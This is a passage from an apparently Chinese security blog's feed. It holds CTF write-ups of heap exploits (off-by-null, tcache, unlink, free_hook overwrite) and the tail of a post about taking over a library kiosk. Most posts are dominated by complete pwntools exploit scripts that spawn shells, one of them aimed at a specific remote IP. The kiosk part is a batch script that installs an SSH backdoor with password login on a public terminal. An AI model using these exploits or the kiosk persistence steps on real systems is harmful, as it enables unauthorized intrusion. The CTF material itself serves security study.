home</span><br><span class="line">md home\Administrator</span><br><span class="line">md home\Administrator\.ssh</span><br><span class="line"></span><br><span class="line">echo C:\openSSH</span><br><span class="line">echo Protocol 2  &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PermitRootLogin no   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PermitEmptyPasswords no   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PasswordAuthentication yes    &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo RSAAuthentication yes       &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PubkeyAuthentication yes   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo AuthorizedKeysFile .ssh/authorized_keys &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">net start opensshd</span><br><span class="line"></span><br><span class="line">reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home Yes</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home  /v native /t REG_SZ /d &quot;C:\openSSH\home&quot;</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home  /v flags /t REG_DWORD /d 0x0000000a</span><br><span class="line"></span><br><span class="line">start control userpassword2</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;前两天复习时无聊，在图书馆看到用来读电子报纸期刊之类的终端，突发奇想想试试能不能把控制下来&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;上面就是一个界面，可以选择期刊报纸之类的，第一个想法就是看能不能先把其他的应用调出来&lt;/p&gt;
&lt;p&gt;一般触控的主机，长按是相当于鼠标右键的点击的，在主
      
    
    </summary>
    
      <category term="渗透" scheme="http://siriuswhiter.tk/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="http://siriuswhiter.tk/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null --more challenge</title>
    <link href="http://siriuswhiter.tk/2019/06/08/off-by-null-more-challenge/"/>
    <id>http://siriuswhiter.tk/2019/06/08/off-by-null-more-challenge/</id>
    <published>2019-06-08T00:49:05.000Z</published>
    <updated>2019-07-21T13:45:33.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>之前随便出的题</p><h2 id="障碍"><a href="#障碍" class="headerlink" title="障碍"></a>障碍</h2><p>低版本libc，没有开启PIE，常见的四项功能都有，edit中存在off-by-null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void get_str(char *ptr,int size)&#123;</span><br><span class="line">    int tmp=0;</span><br><span class="line">    if(size&lt;0)&#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;size;i++)&#123;</span><br><span class="line">        read(0,(ptr+i),1);</span><br><span class="line">        tmp = i;</span><br><span class="line">        if(*(ptr+i)==&apos;\n&apos;)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *(ptr+tmp+1)=0;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前信安大赛提供的赛题就是这个难度的洞，上面为源码。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>没有开启PIE其实就很简单，基本上各方面都没有太多限制，通过溢出overlap来控制指针，下面要么直接控制修改malloc_hook处，要么麻烦一点改bss段指针再任意地址写getshell，之前是直接修改为one_gadget后条件不满足，顺便就把PIE给关了，难度低一点友好点没啥坏处。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./tinynote&apos;)</span><br><span class="line">elf = ELF(&apos;./tinynote&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,note):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Note: \n&apos;,note)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,note):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;size: &apos;,str(size))</span><br><span class="line">        sh.sendlineafter(&apos;Note: \n&apos;,note)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">#--------------over lapping---------------</span><br><span class="line">add(0x90,&apos;0&apos;)</span><br><span class="line">add(0x18,&apos;1&apos;)</span><br><span class="line">add(0x18,&apos;2&apos;)</span><br><span class="line">add(0x110,&apos;3&apos;*0xf0+p64(0x100)+p64(0x21))</span><br><span class="line">add(0x18,&apos;4&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">edit(2,0x18,&apos;2&apos;*0x10+p64(0xe0))</span><br><span class="line">dele(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#-------------leak libc---------------------</span><br><span class="line">add(0x90,&apos;0&apos;)</span><br><span class="line">show(1)</span><br><span class="line">leak = u64(sh.recv(8))</span><br><span class="line">libc_base = leak-88-0x3c4b20</span><br><span class="line">print hex(libc_base)</span><br><span class="line">one = libc_base +0x4526a#+libc.symbols[&apos;system&apos;]</span><br><span class="line">#--------------------------------------</span><br><span class="line">#edit(1,0x18,p64(leak)+p64(leak-88-0x33))</span><br><span class="line">#add(0x60,&apos;a&apos;*0x13)</span><br><span class="line">add(0x18,&apos;3&apos;)</span><br><span class="line">add(0x60,&apos;5&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">edit(5,8,p64(0x60203d))</span><br><span class="line">add(0x60,&apos;2&apos;)</span><br><span class="line">add(0x60,&apos;\x00&apos;*0x13+p64(0x90)+p64(1)+p64(libc.symbols[&apos;__free_hook&apos;]+libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(0,8,p64(one))</span><br><span class="line">dele(2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>西湖论剑的一道题目貌似</p><h2 id="障碍-1"><a href="#障碍-1" class="headerlink" title="障碍"></a>障碍</h2><p>libc版本升级到2.27左右，存在tcache机制，许多操作开始需要绕过tcache机制来实现，但整体思路没有太大的变化。<br>同时这个题的溢出点从edit到了add，相对麻烦一点就是了。</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>多分配一些chunk来将tcache填满，之后对剩下的chunk进行off-by-null实现overlap，好处就是tcache减少了对size的检查，后面更容易实现</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;xihu&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;size:\n&apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;4&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line">    sh.sendafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0xf7,str(i)*0x20)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">#----------------unsorted bin leak libc-------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf8,&apos;&apos;)#0</span><br><span class="line">for i in range(1,7):</span><br><span class="line">    add(0xf7,str(i)) #1-6</span><br><span class="line"></span><br><span class="line">add(0xf7, &apos;7&apos;) #7</span><br><span class="line">edit(7, &apos;a&apos; *  8)</span><br><span class="line">show(7)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">libc_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;)) - 0x3ebca0</span><br><span class="line">print &quot;libc: &quot;+hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">#---------------tcache leak heap -------------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">edit(0,&apos;0&apos;)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x730</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#------fake chunk unlink #---chunk extend cover fd ptr--------------#</span><br><span class="line"></span><br><span class="line">chunk0_addr = heap_base + 0x850</span><br><span class="line">fake_chunk = chunk0_addr + 0x10</span><br><span class="line"></span><br><span class="line">pay = p64(0)+p64(0xf0)+p64(fake_chunk)+p64(fake_chunk)+&apos;a&apos;*0xd0+p64(0xf0)</span><br><span class="line"></span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">for i in range(1,7):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">for i in range(1,8):</span><br><span class="line">    add(0xf7,str(i))</span><br><span class="line"></span><br><span class="line">add(0xf7,&apos;8&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">dele(8)</span><br><span class="line">pay = p64(0)+p64(0x101)+p64(free_hook)</span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf7,&apos;&apos;)</span><br><span class="line">edit(8,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>kctf 2019</p><h2 id="障碍-2"><a href="#障碍-2" class="headerlink" title="障碍"></a>障碍</h2><p>2.27 libc，无PIE，但是会检查分配的地址是否在堆附近<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptr_ = malloc(0x28uLL);</span><br><span class="line">if ( (signed __int64)ptr_ &lt; flag_addr || flag_addr + 0x800 &lt; (signed __int64)ptr_ )// 检查地址</span><br><span class="line">  exit(0);</span><br></pre></td></tr></table></figure></p><p>修改时会检查标志位，有两次修改机会</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>利用new时的off-by-one，创建fake_chunk来实现unlink突破地址限制，控制free_hook 来getshell</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./pwn&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;152.136.18.34&apos;,&apos;10001&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.27.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def new(index,con):</span><br><span class="line">sh.sendlineafter(&quot;show\n&quot;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index:\n&apos;,str(index))</span><br><span class="line">        sh.sendafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">        sh.sendlineafter(&quot;show\n&quot;,&apos;2&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(index,con):</span><br><span class="line">sh.sendlineafter(&quot;show\n&quot;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index:\n&apos;,str(index))</span><br><span class="line">        sh.sendlineafter(&quot;content:\n&quot;,con)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">        sh.sendlineafter(&quot;show\n&quot;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#----------------leak heap ----------------</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index:\n&apos;,&apos;0&apos;)</span><br><span class="line">sh.recvuntil(&apos;gift: &apos;)</span><br><span class="line">heap_base = int(&apos;0x&apos;+sh.recvline()[:-1],16)-0x10</span><br><span class="line">print hex(heap_base)</span><br><span class="line">sh.sendlineafter(&apos;content:\n&apos;,&apos;0&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(1,8):</span><br><span class="line">    new(i,str(i)+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(7,-1,-1):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    new(i,str(i)*0x28+&apos;\x91&apos;)</span><br><span class="line"></span><br><span class="line">new(8,&apos;8\n&apos;)</span><br><span class="line">new(9,&apos;9\n&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(6,-1,-1):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">#-----------------unlink-------------------------</span><br><span class="line"></span><br><span class="line">addr = 0x4040d8</span><br><span class="line">for i in range(10,17):</span><br><span class="line">    new(i,str(i))</span><br><span class="line"></span><br><span class="line">dele(11)</span><br><span class="line">new(11,p64(0)+p64(0x50)+p64(addr-0x18)+p64(addr-0x10))</span><br><span class="line"></span><br><span class="line">dele(12)</span><br><span class="line">new(12,&apos;a&apos;*0x20+p64(0x50)+&apos;\x90&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(13)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----------------leak libc-----------------------</span><br><span class="line">show_flag = 0x404188</span><br><span class="line">edit(11,p64(0x4040c0)+p64(show_flag)+p64(elf.got[&apos;puts&apos;]))</span><br><span class="line"></span><br><span class="line">#sh.interactive()</span><br><span class="line">edit(9,p32(1)+p32(3))</span><br><span class="line">show(10)</span><br><span class="line">leak = u64(sh.recvline()[:-1].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_base = leak - libc.symbols[&apos;puts&apos;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line">free_hook = libc_base+libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line">one = libc_base + libc.symbols[&apos;system&apos;] </span><br><span class="line"></span><br><span class="line">edit(8,p64(0x4040c0)+p64(free_hook))</span><br><span class="line">edit(9,p64(one))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">new(1,&apos;/bin/sh\x00&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>rctf 2019-babyheap</p><h2 id="障碍-3"><a href="#障碍-3" class="headerlink" title="障碍"></a>障碍</h2><p>较低版本libc，开启PIE，但是禁用了fastbin，同时关闭了system execve的系统调用<br>这样基本上无法覆盖bss段的指针，即使想办法可以控制malloc_hook或free_hook指针，也无法直接系统调用getshell</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>通过chunk overlap泄露libc地址，再次调用通过house of storm控制<strong>free_hook，<br>把</strong>free_hook地址设置为setcontext函数，从而控制程序流执行mprotect函数把__free_hook所在内存也修改为可执行，<br>然后读入我们新的shellcode，在跳到新的shellcode去执行getshell。</p><p>另一种思路，泄露堆地址与libc地址，写rop, shellcode到heap，largebin attack &amp; unsortbin attack直接在libc上的free_hook分配chunk<br>将栈转移到heap上，执行rop，执行shellcode getshell。</p><p>这里的shellcode都是通过open read write来实现flag的读取。</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><p>待补充<br><a href="https://xz.aliyun.com/t/5216#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/5216#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;level-0&quot;&gt;&lt;a href=&quot;#level-0&quot; class=&quot;headerlink&quot; title=&quot;level 0&quot;&gt;&lt;/a&gt;level 0&lt;/h1&gt;&lt;p&gt;之前随便出的题&lt;/p&gt;
&lt;h2 id=&quot;障碍&quot;&gt;&lt;a href=&quot;#障碍&quot; class=&quot;heade
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2019 pwn</title>
    <link href="http://siriuswhiter.tk/2019/06/04/ciscn-2019-pwn/"/>
    <id>http://siriuswhiter.tk/2019/06/04/ciscn-2019-pwn/</id>
    <published>2019-06-04T13:20:37.000Z</published>
    <updated>2019-06-07T02:12:03.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><h2 id="题目-amp-amp-分析"><a href="#题目-amp-amp-分析" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>ret2libc</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">#coding = utf8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;Emachine&apos;)</span><br><span class="line">elf = ELF(&apos;Emachine&apos;)</span><br><span 